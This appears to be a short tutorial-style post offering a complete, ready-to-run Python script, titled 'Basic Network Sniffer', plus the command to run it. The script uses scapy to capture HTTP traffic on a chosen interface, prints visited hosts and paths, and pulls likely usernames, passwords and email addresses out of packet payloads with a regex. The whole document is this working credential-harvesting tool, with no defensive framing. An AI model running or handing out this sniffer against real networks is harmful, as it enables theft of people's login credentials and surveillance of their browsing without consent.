 Basic Network Sniffer
Python code to execute...
"
import scapy.all as scapy
import argparse
from scapy.layers import http
import re

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode('utf-8')
        path = packet[http.HTTPRequest].Path.decode('utf-8')
        print("[+] HTTP Request >> " + host + path)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8')
            credential_regex = r"(username|password|pass|email)\s*:\s*(.*)"
            matches = re.findall(credential_regex, load)

            if matches:
                for match in matches:
                    print("[+] Possible credential: {}: {}".format(match[0], match[1]))

iface = get_interface()
sniff(iface)"

Execute .py file: "python 'file name.py' -i 'interface'"
